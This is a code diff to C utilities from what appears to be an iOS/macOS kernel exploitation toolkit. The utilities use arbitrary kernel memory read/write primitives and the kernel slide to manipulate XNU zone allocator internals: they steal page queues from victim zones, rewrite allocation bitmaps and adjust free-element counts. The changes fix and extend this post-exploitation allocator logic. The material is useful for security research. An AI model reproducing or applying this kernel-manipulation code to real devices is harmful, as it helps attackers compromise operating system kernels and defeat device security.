@@ -112,6 +112,7 @@ uint32_t xe_util_zalloc_find_primary_pageq(uint32_t pageq_start, uint max_depth,
 uintptr_t xe_util_zalloc_find_victim_zone(uint elem_size) {
     uintptr_t victim_zone = 0;
     uint victim_zone_empty_pageq_depth = 0;
+    int victim_zone_loss = INT32_MAX;
     
     for (int i=0; i<VAR_ZONE_ARRAY_LEN; i++) {
         uintptr_t zone = xe_util_zalloc_find_zone_at_index(i);
@@ -136,11 +137,9 @@ uintptr_t xe_util_zalloc_find_victim_zone(uint elem_size) {
             continue;
         }
         
-        uint bitmap_count = (z_chunk_pages * XE_PAGE_SIZE) / z_elem_size;
-        uint required_bitmap_count = (z_chunk_pages * XE_PAGE_SIZE) / elem_size;
-        if (bitmap_count < required_bitmap_count) {
-            continue;
-        }
+        int bitmap_count = ((((z_chunk_pages * XE_PAGE_SIZE) / z_elem_size) + 63) / 64) * 64;
+        int required_bitmap_count = (z_chunk_pages * XE_PAGE_SIZE) / elem_size;
+        int loss = xe_max(0, required_bitmap_count - bitmap_count);
         
         uint32_t pageq_empty = xe_kmem_read_uint32(zone, TYPE_ZONE_MEM_Z_PAGEQ_EMPTY_OFFSET);
         if (!pageq_empty) {
@@ -149,23 +148,29 @@ uintptr_t xe_util_zalloc_find_victim_zone(uint elem_size) {
         
         uint found_depth;
         xe_util_zalloc_find_primary_pageq(pageq_empty, 10, &found_depth, NULL);
-        if (found_depth > victim_zone_empty_pageq_depth) {
+        
+        if (!found_depth) {
+            continue;
+        }
+        
+        if (loss < victim_zone_loss || (loss <= victim_zone_loss && found_depth > victim_zone_empty_pageq_depth)) {
             victim_zone = zone;
+            victim_zone_loss = loss;
             victim_zone_empty_pageq_depth = found_depth;
         }
     }
     
     if (victim_zone) {
+        xe_log_info("using pageq from zone %p, loss: %d, depth: %d", (void*)victim_zone, victim_zone_loss, victim_zone_empty_pageq_depth);
         return victim_zone;
     }
     
-    xe_log_error("[ERROR] failed to find victim zone for elem size %u", elem_size);
+    xe_log_error("failed to find victim zone for elem size %u", elem_size);
     abort();
 }
 
 void xe_util_init_bitmap_inline(uintptr_t meta_base, uint32_t elem_size) {
-    uint16_t zm_chunk_len;
-    xe_kmem_read_bitfield(&zm_chunk_len, meta_base, TYPE_ZONE_PAGE_METADATA_MEM_ZM_CHUNK_LEN_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_MEM_ZM_CHUNK_LEN_BIT_SIZE);
+    uint16_t zm_chunk_len = xe_kmem_read_uint16(meta_base, 0) >> TYPE_ZONE_PAGE_METADATA_MEM_ZM_CHUNK_LEN_BIT_OFFSET;
     
     uint elements = (zm_chunk_len * XE_PAGE_SIZE) / elem_size;
     for (int i=0; i<zm_chunk_len; i++) {
@@ -182,8 +187,7 @@ void xe_util_init_bitmap_inline(uintptr_t meta_base, uint32_t elem_size) {
 }
 
 void xe_util_init_bitmap_ref(uintptr_t meta_base, uint32_t elem_size) {
-    uint16_t zm_chunk_len;
-    xe_kmem_read_bitfield(&zm_chunk_len, meta_base, TYPE_ZONE_PAGE_METADATA_MEM_ZM_CHUNK_LEN_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_MEM_ZM_CHUNK_LEN_BIT_SIZE);
+    uint16_t zm_chunk_len = xe_kmem_read_uint16(meta_base, 0) >> TYPE_ZONE_PAGE_METADATA_MEM_ZM_CHUNK_LEN_BIT_OFFSET;
     uint32_t zm_bitmap = xe_kmem_read_uint32(meta_base, TYPE_ZONE_PAGE_METADATA_MEM_ZM_BITMAP_OFFSET);
     
     uintptr_t bitmap_base = xe_util_zalloc_bitmap_offset_to_ref(zm_bitmap);
@@ -200,12 +204,14 @@ void xe_util_init_bitmap_ref(uintptr_t meta_base, uint32_t elem_size) {
         xe_kmem_write_uint64(bitmap, 0, value);
         elements -= batch_size;
     }
-    xe_assert(elements == 0);
+    
+    if (elements != 0) {
+        xe_log_warn("dropped %d elements due to insuffient bitmap length", elements);
+    }
 }
 
 void xe_util_zalloc_init_bitmap(uintptr_t meta, uint elem_size) {
-    _Bool zm_inline;
-    xe_kmem_read_bitfield(&zm_inline, meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_INLINE_BITMAP_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_MEM_ZM_INLINE_BITMAP_BIT_SIZE);
+    _Bool zm_inline = xe_kmem_read_uint16(meta, 0) & (1 << TYPE_ZONE_PAGE_METADATA_MEM_ZM_INLINE_BITMAP_BIT_OFFSET);
     if (zm_inline) {
         xe_util_init_bitmap_inline(meta, elem_size);
     } else {
@@ -251,6 +257,16 @@ uint32_t xe_util_zalloc_steal_pageq(uintptr_t recipient_zone, uint elem_size, ui
     uintptr_t prev_meta = prev_pageq ? xe_util_zalloc_pageq_to_meta(prev_pageq) : 0;
     uintptr_t next_meta = next_pageq ? xe_util_zalloc_pageq_to_meta(next_pageq) : 0;
     
+    uintptr_t zone_info = xe_slider_kernel_slide(VAR_ZONE_INFO_ADDR);
+    uintptr_t meta_min = xe_kmem_read_uint64(zone_info, TYPE_ZONE_INFO_MEM_ZI_META_RANGE_OFFSET);
+    uintptr_t meta_max = xe_kmem_read_uint64(zone_info, TYPE_ZONE_INFO_MEM_ZI_META_RANGE_OFFSET + 8);
+    if (prev_meta < meta_min || prev_meta > meta_max) {
+        prev_meta = 0;
+    }
+    if (next_meta < meta_min || next_meta > meta_max) {
+        next_meta = 0;
+    }
+    
     if (prev_meta && next_meta) {
         xe_kmem_write_uint32(prev_meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_NEXT_OFFSET, next_pageq);
         xe_kmem_write_uint32(next_meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_PREV_OFFSET, prev_pageq);
@@ -258,6 +274,8 @@ uint32_t xe_util_zalloc_steal_pageq(uintptr_t recipient_zone, uint elem_size, ui
         xe_kmem_write_uint32(prev_meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_NEXT_OFFSET, 0);
     } else if (next_meta) {
         xe_kmem_write_uint32(next_meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_PREV_OFFSET, 0);
+    } else {
+        xe_kmem_write_uint32(victim_zone, TYPE_ZONE_MEM_Z_PAGEQ_EMPTY_OFFSET, 0);
     }
     
     xe_kmem_write_uint32(meta_head, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_PREV_OFFSET, 0);
@@ -293,6 +311,8 @@ size_t xe_util_zalloc_steal_pages(uintptr_t recipient_zone, uint min_num_pages, 
 
 xe_util_zalloc_t xe_util_zalloc_create(uintptr_t zone, uint num_pages) {
     xe_assert(xe_kmem_read_uint64(zone, 0) == zone);
+    xe_log_debug("creating zalloc for zone with size %d", xe_kmem_read_uint16(zone, TYPE_ZONE_MEM_Z_ELEM_SIZE_OFFSET));
+    
     _Bool z_percpu;
     xe_kmem_read_bitfield(&z_percpu, zone, TYPE_ZONE_MEM_Z_PERCPU_BITFIELD_OFFSET, TYPE_ZONE_MEM_Z_PERCPU_BITFIELD_SIZE);
     xe_assert(z_percpu == 0);
@@ -332,12 +352,11 @@ int xe_util_zba_scan_bitmap_ref(uintptr_t meta, uint* eidx_out) {
 }
 
 int xe_util_zba_scan_bitmap_inline(uintptr_t meta_base, uint* eidx_out) {
-    uint8_t zm_chunk_len;
-    xe_kmem_read_bitfield(&zm_chunk_len, meta_base, TYPE_ZONE_PAGE_METADATA_MEM_ZM_CHUNK_LEN_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_MEM_ZM_CHUNK_LEN_BIT_SIZE);
+    uint8_t zm_chunk_len = xe_kmem_read_uint16(meta_base, 0) >> TYPE_ZONE_PAGE_METADATA_MEM_ZM_CHUNK_LEN_BIT_OFFSET;
     xe_assert(zm_chunk_len <= 0x8);
     
     for (int i=0; i<zm_chunk_len; i++) {
-        uintptr_t meta = meta_base * i * TYPE_ZONE_PAGE_METADATA_SIZE;
+        uintptr_t meta = meta_base + i * TYPE_ZONE_PAGE_METADATA_SIZE;
         uint32_t zm_bitmap = xe_kmem_read_uint32(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_BITMAP_OFFSET);
         if (!zm_bitmap) {
             continue;
@@ -353,8 +372,7 @@ int xe_util_zba_scan_bitmap_inline(uintptr_t meta_base, uint* eidx_out) {
 }
 
 int xe_util_meta_find_and_clear_bit(uintptr_t meta, uint* eidx_out) {
-    uint16_t zm_inline_bitmap;
-    xe_kmem_read_bitfield(&zm_inline_bitmap, meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_INLINE_BITMAP_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_MEM_ZM_INLINE_BITMAP_BIT_SIZE);
+    uint16_t zm_inline_bitmap = xe_kmem_read_uint16(meta, 0) & (1 << TYPE_ZONE_PAGE_METADATA_MEM_ZM_INLINE_BITMAP_BIT_OFFSET);
     
     if (zm_inline_bitmap) {
         return xe_util_zba_scan_bitmap_inline(meta, eidx_out);
@@ -369,6 +387,12 @@ void xe_util_zalloc_apply_meta_alloc_size_diff(uintptr_t meta, int diff) {
     xe_kmem_write_uint16(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_ALLOC_SIZE_OFFSET, current + diff);
 }
 
+void xe_util_zalloc_apply_zone_size_diff(uintptr_t zone, int diff) {
+    uint32_t current = xe_kmem_read_uint32(zone, TYPE_ZONE_MEM_Z_ELEMS_FREE_OFFSET);
+    uint32_t new = (-diff > current) ? 0 : (current + diff);
+    xe_kmem_write_uint32(zone, TYPE_ZONE_MEM_Z_ELEMS_FREE_OFFSET, new);
+}
+
 uintptr_t xe_util_zalloc_alloc(xe_util_zalloc_t util) {
     uint16_t z_elem_size = xe_kmem_read_uint16(util->zone, TYPE_ZONE_MEM_Z_ELEM_SIZE_OFFSET);
     for (size_t i=0; i<util->pageq_len; i++) {
@@ -378,6 +402,7 @@ uintptr_t xe_util_zalloc_alloc(xe_util_zalloc_t util) {
         int error = xe_util_meta_find_and_clear_bit(meta, &eidx);
         if (!error) {
             xe_util_zalloc_apply_meta_alloc_size_diff(meta, z_elem_size);
+            xe_util_zalloc_apply_zone_size_diff(util->zone, -3);
             uintptr_t page = xe_util_zalloc_pva_to_addr(pageq);
             return page + eidx * z_elem_size;
         }
@@ -415,8 +440,7 @@ int xe_util_zalloc_meta_clear_bitmap_ref(uintptr_t meta_base, int eidx) {
 }
 
 int xe_util_zalloc_meta_clear_bit(uintptr_t meta, int eidx) {
-    uint16_t zm_inline_bitmap;
-    xe_kmem_read_bitfield(&zm_inline_bitmap, meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_INLINE_BITMAP_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_MEM_ZM_INLINE_BITMAP_BIT_SIZE);
+    uint16_t zm_inline_bitmap = xe_kmem_read_uint16(meta, 0) & (1 << TYPE_ZONE_PAGE_METADATA_MEM_ZM_INLINE_BITMAP_BIT_OFFSET);
     
     if (zm_inline_bitmap) {
         return xe_util_zalloc_meta_clear_bitmap_inline(meta, eidx);
@@ -448,11 +472,16 @@ uintptr_t xe_util_zalloc_alloc_at(xe_util_zalloc_t util, uintptr_t address) {
             abort();
         }
         xe_util_zalloc_apply_meta_alloc_size_diff(meta, z_elem_size);
+        xe_util_zalloc_apply_zone_size_diff(util->zone, -3);
         return 0;
     }
     
     xe_log_error("address not allocated by allocator");
     abort();
+}
+
+uint16_t xe_util_zalloc_z_elem_size(xe_util_zalloc_t util) {
+    return xe_kmem_read_uint16(util->zone, TYPE_ZONE_MEM_Z_ELEM_SIZE_OFFSET);
 }
 
 void xe_util_zalloc_free(xe_util_zalloc_t util, uintptr_t address) {
